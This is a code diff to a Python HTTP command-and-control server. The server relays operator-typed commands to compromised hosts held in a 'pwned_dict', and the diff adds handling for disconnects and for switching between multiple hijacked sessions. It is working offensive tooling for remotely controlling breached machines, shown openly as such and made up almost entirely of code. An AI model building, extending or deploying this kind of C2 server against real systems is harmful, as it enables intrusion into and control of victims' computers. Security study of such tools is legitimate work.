@@ -52,8 +52,38 @@ class C2Handler(BaseHTTPRequestHandler):
                 command = input(f"{client_account}@{client_hostname}: ")
 
                 # Write the command back to the client as a response; must utf-8 encode
-                self.http_response(200)
-                self.wfile.write(command.encode())
+                try:
+                    self.http_response(200)
+                    self.wfile.write(command.encode())
+
+                # If an exception occurs, notify and remove the active session from the dictionary
+                except BrokenPipeError:
+                    print(f"{client_account}@{client_hostname} has disconnected!\n")
+                    del pwned_dict[active_session]
+
+                    # If the dictionary is empty, re-initialize variables to their starting values
+                    if not pwned_dict:
+                        print("Waiting for new connection.\n")
+                        pwned_id = 0
+                        active_session = 1
+                    else:
+                        #Display sessions in our dictionary and choose one of them to switch over to
+                        while True:
+                            print(*pwned_dict.items(), sep="\n")
+                            try:
+                                new_session = int(input("\n Choose a session number to make active: "))
+                            except ValueError:
+                                print("\nYou must choose a pwned id of one of the sessions shown on the screem\n")
+                                continue
+
+                            # Ensure we enter a pwned_id that is in our pwnd_dict and set active_session to it
+                            if new_session in pwned_dict:
+                                active_session = new_session
+                                print(f"\nActive session is now {pwned_dict[active_session]}")
+                                break
+                            else:
+                                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
+                                continue
 
             # The client is in pwned_dict, but it is not our active session:
             else:
